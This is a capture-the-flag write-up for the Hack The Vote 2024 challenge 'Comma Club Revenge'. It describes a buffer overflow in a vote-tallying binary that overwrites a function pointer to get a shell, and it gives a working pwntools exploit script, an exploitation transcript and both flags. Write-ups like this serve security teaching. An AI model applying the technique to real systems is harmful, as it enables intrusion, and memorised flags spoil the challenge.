---
title: "Comma Club Revenge - Hack The Vote 2024"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "checksec", "comma", "club", "revenge", "stack", "hack-the-vote", "hack-the-vote-2024", "2024", "ctf-writeup"]
summary: "\"We need somone to run our vote tallying machine, and it needs to be someone trustworthy."
source:
  name: "CTFtime writeup #39634"
  url: "https://ctftime.org/writeup/39634"
original_source: "https://pegielm.github.io/posts/comma_club_writeup/"
ctf:
  name: "Hack The Vote 2024"
  year: 2024
  challenge: "Comma Club Revenge"
---

## Metadata

- **CTF:** Hack The Vote 2024
- **Task:** Comma Club Revenge
- **Author team:** hack_2ah
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/39634>
- **Original writeup:** <https://pegielm.github.io/posts/comma_club_writeup/>

---
# Challenge description

[link to challange](https://hackthe.vote/challenges#Comma%20Club-12)

"We need somone to run our vote tallying machine, and it needs to be someone trustworthy. Apparently there's some problem if a candidate gets too many votes. Shouldn't be a problem for us in Wyoming though."

nc comma-club.chal.hackthe.vote 1337

[file](https://hackthe.vote/files/7bc724cdc53f5e8375258cb26e69b258/comma-club.tar.gz)  
![](http://)  
# Solution

After inspecting the checksec output, we can see that the binary is not stripped and has all the protections disabled. We can also see that the binary is a 64-bit ELF file.

![checksec]<https://pegielm.github.io/images/comma/comma_checksec.png>)

In program we can add votes for cadidates and check the results. Other fuctionalities are locked with password. After inspecting the binary in IDA we can see that goal is to get to the close voting option ( it executes system("/bin/sh") ).

![ida](<https://pegielm.github.io/images/comma/comma_goal.png>)

When adding votes there is a limit of 584057 votes that we cann add to the candidate. Also when displaying the results, the program checks if the candidate has more than 584057 votes and if so, resets them to 0, but this happens only when we call the function that displays the results.

Candidates are stored in a structure that is innitialized like this:

![candidates](<https://pegielm.github.io/images/comma/comma_candidate_structure.png>)

After experimenting with the program, if we add a lot of votes for a candidate, the program will crash wig SIGSEGV. 

![cand_array](<https://pegielm.github.io/images/comma/comma_cand_array.png>)

Here in debuger we can see how candidates are stored in memory.   
(Name, votes,string representation of votes and poiter to function that displays the results)

Function print_int_with_commas has a buffer overflow vulnerability. We can overwrite the pointer to the function that displays the results. 

![chage_password_function](<https://pegielm.github.io/images/comma/comma_change_password_function.png>)

So we can overwrite last byte of the pointer so it points to change_password_to function. Last byte needs to be 0x39 which is 9 is ASCII. 

Here you can see how the cand_array looks like after overwriting the pointer.

![overwritten_pointer](<https://pegielm.github.io/images/comma/comma_overflowed.png>)

Last step is to determine to what password will be changed. We can see that by inspecting RAX register when we enter function.

![password](<https://pegielm.github.io/images/comma/comma_new_password.png>)

Here is final exploit:

```python  
from pwn import *  
from binascii import *  
PATH = './challenge'  
ADDR = 'comma-club.chal.hackthe.vote'  
PORT = 1337  
elf = context.binary = ELF(PATH)  
context.log_level = 'debug'  
####  
#r = remote(ADDR, PORT)  
####  
r = process(PATH)  
####  
# context.terminal = ['wt.exe','wsl.exe']  
# r = gdb.debug(args=[elf.path])  
###  
r.recvuntil(b'> ')  
r.sendline(b'1') #add vote option  
votes = 1000009  
reminder = votes % 584056  
reps = votes//584056  
for i in range(reps):  
r.recvuntil(b'> ')  
r.sendline(b'1') #select candidate  
r.recvuntil(b'> ')  
r.sendline(b'584056') #add votes  
r.recvuntil(b'> ')  
r.sendline(b'1')  
r.recvuntil(b'> ')  
r.sendline(str(reminder).encode()) #add rest of votes  
r.recvuntil(b'> ')  
r.sendline(b'3') #quit  
r.recvuntil(b'> ')  
r.sendline(b'2') #print votes  
r.recvuntil(b'> ')  
r.sendline(b'3') #end vote  
r.recvuntil(b'> ')  
r.sendline(b'Total') #password  
r.interactive() #shell  
```

Also program can be exploited like this:

```  
Welcome to the Wyoming Vote Tallying Software  
Presented by Jeff!  
Please select an option:  
1) Enter votes for a candidate  
2) View current vote totals  
3) Close voting and display the winner (requires password)  
4) Change password (requires password)  
> 1  
Select a candidate to add votes to, or 3 to return  
1): Wilfred J Lewis  
2): Jeanette D Westcott  
> 1  
Enter the votes to add  
> 500009  
Select a candidate to add votes to, or 3 to return  
1): Wilfred J Lewis  
2): Jeanette D Westcott  
> 1  
Enter the votes to add  
> 500000  
Select a candidate to add votes to, or 3 to return  
1): Wilfred J Lewis  
2): Jeanette D Westcott  
> 3  
Please select an option:  
1) Enter votes for a candidate  
2) View current vote totals  
3) Close voting and display the winner (requires password)  
4) Change password (requires password)  
> 2  
password change sucessful.

Candidate cannot have more votes than the population of Wyoming (584057).  
Resetting vote count to 0.  
**********************************************************************  
* Candidate: Wilfred J Lewis - S *  
* Vote Tally: 0 *  
* [ ] ( 0.00%) *  
* *  
**********************************************************************

**********************************************************************  
* Candidate: Jeanette D Westcott - T *  
* Vote Tally: 0 *  
* [ ] ( 0.00%) *  
* *  
**********************************************************************

Please select an option:  
1) Enter votes for a candidate  
2) View current vote totals  
3) Close voting and display the winner (requires password)  
4) Change password (requires password)  
> 3  
Please enter the password  
> Total  
Correct!  
Voting is now closed! The winner is Wilfred J Lewis with 0 votes!  
This program will now exit.  
cat flag  
flag{w3lc0me_2_TH3_2_c0mm4_c1ub}  
```

This exploit happend to work also on second part of the challange called comma-club-revenge (this challange could be also exploited by sending null bytes as password to terminate strncpy).

Second flag:  
```  
flag{W3lc0Me_t0_TH3_gr34t3r_th4N_0n3_c0Mm4_c1Ub}  
```
